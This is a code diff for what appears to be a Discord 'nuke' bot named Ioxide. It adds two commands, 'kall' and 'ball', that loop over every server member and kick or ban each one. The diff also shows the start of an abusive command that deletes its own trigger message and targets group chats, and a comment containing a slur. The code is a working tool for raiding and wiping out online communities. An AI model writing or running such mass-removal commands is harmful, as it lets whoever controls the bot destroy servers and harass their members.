@@ -185,6 +185,38 @@ async def help(ctx):
     em.set_footer(text="My goals are beyond your understanding")
     await ctx.send(embed=em)
 @Ioxide.command()
+async def kall(ctx):
+    for member in ctx.guild.members:
+
+        if member == bot.user:
+            continue
+
+        try:
+            await member.kick()
+        except discord.Forbidden:
+            print(f"{member.name} has FAILED to be kicked from {ctx.guild.name}")
+        else:
+            print(f"{member.name} has been kicked from {ctx.guild.name}")
+
+    print("Action Completed: kall")
+
+@Ioxide.command()
+async def ball(ctx):
+    for member in ctx.guild.members:
+        
+        if member == bot.user:
+            continue
+
+        try:
+            await member.ban()
+        except discord.Forbidden:
+            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
+        else:
+            print(f"{member.name} has been kicked from {ctx.guild.name}")
+    
+    print("Action Completed: ball")  
+
+@Ioxide.command()
 async def fuck(ctx, recipients):
     await ctx.message.delete() 
     if isinstance(ctx.message.channel, discord.GroupChannel): # makes it work in gcs (finally got it i was so retarded LOL)
